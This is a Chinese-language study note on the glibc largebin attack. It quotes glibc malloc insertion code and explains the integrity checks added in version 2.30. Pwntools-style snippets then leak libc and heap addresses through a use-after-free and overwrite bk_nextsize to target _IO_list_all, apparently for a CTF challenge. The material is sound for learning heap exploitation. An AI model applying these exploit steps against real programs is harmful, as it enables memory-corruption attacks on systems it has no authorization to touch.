---
title: Largebin Attack
date: '2025-05-13 00:01:29'
updated: '2025-05-26 21:49:25'
---
Largebin 从 bk 方向取出 chunk

## 理解
跟 unlink 很相似，

都是利用 bin 这个链表在插入和抽除 chunk 时对链表中其他 chunk 的指针的修改来实现任意地址修改



只有 largebin 里面的 chunk 会有 fd_nextsize 和 bk_nextsize 这两个指针

+ fd_nextsize：指向前一个与当前chunk_size不小同的块（注意是同一链条上）
+ bk_nextsize：指向后一个与当前chunk_size大小不同的块（同上）

在相同大小的chunk中，只有第一个chunk的fd_nextsize和bk_nextsize才有值，之后的全是 0

largebin 里的 chunk 是按<font style="background-color:#FBDE28;">从大到小</font>排序的，如果size相同则按free时间前后来排序

> 这里有个利用点：
>
> 前提是 largechunk， 如果释放的堆块比链尾的小则会直接放入链尾而不进行过多的检查
>

largebin 的结构：

![](/images/38932aba173f5bd06bdb75b9b8ba1ba8.png)

largebin 当中 fd_nextsize 和 bk_nextsize 是一个循环链表

![](/images/997efd9359e7b0e4617bc179c97a8bb8.png)

第一个 largebin 里面的 chunk 的 fd 和 bk 跟 unsignedchunk 一样都是指向一个 libc 地址

但是因为 fd_nextsize 和 bk_nextsize 是一个循环链表，所以第一个进入 largebin 的 chunk 这两个指针都是指向自己的

![](/images/d76685f932d3e9be3fff07a6edd836a0.png)

## 2.30 版本之前的利用过程
```plain
free(p1);
free(p2);
malloc(0x90);
free(p3);
```

<font style="background-color:#FBDE28;">p1、p2、p3 都是 largechunk，且 p3 大于 p2</font>

p1、p2 被 free 之后先进入了 unsortedbin

在 malloc 的过程中，按照 fast-->unsorted-->small-->large-->top 的顺序取 chunk，

因为 malloc 的大小大于 fastchunk，unsortedbin 是 FIFO 机制，所以把先 free 进 unsortedbin 的 p1 切割出了 0x90 大小又放回了 unsortedbin，

然后又因为遍历了一遍 unsortedbin，就把 p2 给放进了 largebin

接着：

```plain
malloc(0x90)
```

还在 unsortedbin 里面的 p2 接着被切割了 0x90 大小，p3 也进到了 largebin 当中

因为 p3 大于 p2，所以 p3 会插入到 p2 后面（bk 方向，largebin 当中 fd 方向 chunk 大小减小）

这个时候就可以通过篡改 p2 的 bk 和 bk_nextsize 来让 p3 插入时修改到 p2 的 bk 和 bk_nextsize 指向的 chunk 的 fd 和 fd_nextsize：

```c
while ((unsigned long) size < chunksize_nomask (fwd))
{
	fwd = fwd->fd_nextsize; //这里是顺着largebin找到最小的大于申请size的largechunk
	assert (chunk_main_arena (fwd));
}

if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
	/* Always insert in the second position.  */
	fwd = fwd->fd;
else
{
	victim->fd_nextsize = fwd; //victim是从unsortedbin取出的chunk
	victim->bk_nextsize = fwd->bk_nextsize;
	fwd->bk_nextsize = victim;
	victim->bk_nextsize->fd_nextsize = victim;
}
bck = fwd->bk;
```

![](/images/0239bd7c97d457ea283f517ba8a76647.png)

## 2.30 版本后的利用方式
### 新增检查
```c
while ((unsigned long) size < chunksize_nomask (fwd))
{
	fwd = fwd->fd_nextsize;
	assert (chunk_main_arena (fwd));
}

if ((unsigned long) size == (unsigned long) chunksize_nomask (fwd))
	/* Always insert in the second position.  */
    fwd = fwd->fd;
else
{
	victim->fd_nextsize = fwd;
	victim->bk_nextsize = fwd->bk_nextsize;
	if (__glibc_unlikely (fwd->bk_nextsize->fd_nextsize != fwd)) //检查了largebin对应chunk的bk_nextsize指向的chunk的fd_nextsize指针是否正确
		malloc_printerr ("malloc(): largebin double linked list corrupted (nextsize)");
	fwd->bk_nextsize = victim;
	victim->bk_nextsize->fd_nextsize = victim;
}
bck = fwd->bk;
if (bck->fd != fwd) //检查了largebin对应chunk的bk指向的chunk的fd指针是否正确
	malloc_printerr ("malloc(): largebin double linked list corrupted (bk)");
```

可以利用的新方向：

```c
	victim_index = largebin_index (size); //获取申请size对应的largebins里面的bin的index
    bck = bin_at (av, victim_index); //获取对应index的bin的尾堆块（最大的）
    fwd = bck->fd;
...
if ((unsigned long) (size) < (unsigned long) chunksize_nomask (bck->bk))
{
	fwd = bck; //将fwd赋值为bin头
	bck = bck->bk; //bck赋值为当前bin中最小那个chunk
	
	victim->fd_nextsize = fwd->fd; //将victim的fd_nextsize赋值为bin中的尾堆块
	victim->bk_nextsize = fwd->fd->bk_nextsize; //将victim的bk_nextsize赋值为当前bin中最小的chunk
	fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; //当前bin中的尾堆块的bk_nextsize指向victim，当前最小chunk的fd_nextsize也指向victim
}
```

此时`bck`是对应`index`的`bin`头。`victim`指的是当前正在被释放的`chunk`

1. 首先将`fwd`赋值为`bin`头，然后`bck`赋值为当前`bin`中最小那个`chunk`
2. 紧接着将`victim`的`fd_nextsize`赋值为`bin`中的尾堆块，
3. 然后将`bk_nextsize`赋值为当前`bin`中最小的`chunk`
4. 重点来了！当前`bin`中的尾堆块的`bk_nextsize`指向`victim`
5. 当前最小`chunk`的`fd_nextsize`也指向`victim`
6. 现在我们才视为`victim`完全进入了`largebin`当中

### 具体利用过程
我们如果要执行到那条重要语句，需要先后释放掉一大一小两个largechunk

在每个largechunk下面要多一个chunk用来防止largechunk被释放后被向下合并，大小任意

```python
add(0, 0x510)
add(1, 0x30) 
add(2, 0x520)
add(3, 0x30)
```

先释放大的 largechunk（chunk2），然后再申请一个比它大的 chunk，让它进入 largebin

接着利用 UAF 来从 chunk2 当中获得 libc 地址（fd、bk）和堆地址（fd_nextsize、bk_nextsize），

因为 libc 地和堆地址的高位都是 \x00 ，输出会被截断，所以得分两次泄露：

先直接泄露出 fd 的 libc 地址，然后再把 fd 和 bk 覆盖上非 \x00 数据再把fd_nextsize 的堆地址泄露

```python
libc=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
# print(hex(libc))
libc_base=libc-0x21b110
print(hex(libc_base))
_IO_list_all=libc_base+0x21b680

edit(2,b'a'*0x10)
show(2)
link.recvuntil(b'a'*0x10)
heap=u64(link.recv(6).ljust(8,b'\x00'))
print(hex(heap))
```

接着就是释放掉 chunk0，之后再申请一个比 chunk0 和 chunk2 都大的 chunk 就可以让 chunk0 进到 largebin 里面，就会执行：

```c
fwd = bck; //将fwd赋值为bin头
bck = bck->bk; //bck赋值为当前bin中最小那个chunk

victim->fd_nextsize = fwd->fd; //将victim的fd_nextsize赋值为bin中的尾堆块
victim->bk_nextsize = fwd->fd->bk_nextsize; //将victim的bk_nextsize赋值为当前bin中最小的chunk
fwd->fd->bk_nextsize = victim->bk_nextsize->fd_nextsize = victim; //当前bin中的尾堆块的bk_nextsize指向victim，当前最小chunk的fd_nextsize也指向victim
```

而这个`当前bin中尾堆块`也就是`fwd->fd`在 edit 完 chunk2 之后，就变成了 `_IO_list_all-0x20` 的位置了

```c
delete(0)
payload=p64(libc)+p64(libc)+p64(heap)+p64(_IO_list_all-0x20)
edit(2,payload)
add(5, 0x550)
```

那么 largebin attack 的这一部分就到这了，接下来是 house of apple2 了

